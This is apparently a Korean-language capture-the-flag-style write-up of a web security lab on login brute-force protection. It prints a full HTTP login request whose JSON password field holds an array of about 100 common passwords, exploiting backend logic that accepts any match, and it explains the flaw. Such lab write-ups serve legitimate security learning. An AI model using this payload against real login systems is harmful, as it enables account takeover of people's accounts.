# 🏴Lab: Broken brute-force protection, multiple credentials per request

```text
This lab is vulnerable due to a logic flaw in its brute-force protection.
To solve the lab, brute-force Carlos's password, then access his account page.
```

### 🔍 분석 및 공격 과정
1. carlos:무작위 비밀번호로 로그인 시도후 프록시로 관찰해보자.
2. json 파일로 보내고 있다.
3. 혹시 배열을 허용한다면 비밀번호에 배열을 집어넣어 한요청에 수많은 비밀번호를 순회하며 인증을 확인하도록 하는게 가능한지 체크해보자.
```http
POST /login HTTP/2
Host: 0ac1001103ae5fad80e28fe1005600cf.web-security-academy.net
Cookie: session=jmJGLynikgpS6OmPCB4AWbwG6gt5CJ0B
Content-Length: 1085
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: ko-KR,ko;q=0.9
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ac1001103ae5fad80e28fe1005600cf.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac1001103ae5fad80e28fe1005600cf.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"username":"carlos","password":
["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]}
```
4. 로그인 성공. solve
                        
### 💡 취약점 원리
 json파일을 처리할때 password의 배열 입력을 허용하여 여러 패스워드들을 한꺼번에 보내는게 가능했다. 또한 백엔드 로직에서 password 값이 배열일때 이를 내부적으로 루프를 돌며 하나라도 일치하면
 인증에 성공하도록 잘못 설계되어있다.
